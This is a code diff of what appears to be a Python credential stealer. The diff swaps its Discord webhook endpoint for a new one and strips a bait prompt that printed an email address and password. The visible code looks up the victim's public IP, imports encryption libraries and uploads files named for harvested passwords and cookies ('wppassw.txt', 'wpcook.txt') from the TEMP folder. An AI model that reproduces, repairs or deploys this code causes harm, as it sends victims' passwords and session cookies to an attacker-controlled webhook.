@@ -18,16 +18,8 @@ import re
 import subprocess
 import json
 import urllib.request
-hook="https://discord.com/api/webhooks/1371216177837113505/EbO651HSMGvQPapMfw-YKEMWdkfo4Exuwu-E-wqWmy6PpUBDTGZEHJZn3QklCYt83iw4"
+hook="https://discord.com/api/webhooks/1400411578884558888/xC5UnfwX5nYD7vf1vJwPlk5-lFX5fFVhoVJzCwlerZlRanIA9hS6_QGsg-kpyKwpgfIb"
 DETECTED=False
-
-user_input = input("region: ")
-
-if user_input.lower() == "greece":
-    print("gaopat@gmail.com")
-    print("ge26f68")
-else:
-    print("invalid region")
 
 # Get public IP
 ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
@@ -53,7 +45,7 @@ def getip():
         ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()
     except:
         pass
-    return ip           
+    return ip
 requirements=[
 ['requests','requests'],
 ['Crypto.Cipher','pycryptodome']
@@ -591,7 +583,7 @@ def GatherAll():
         threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()
     for thread in Threadlist:
         thread.join()
-    global upths    
+    global upths
     upths=[]
     for file in['wppassw.txt','wpcook.txt']:
         upload(os.getenv('TEMP')+'\\'+file)
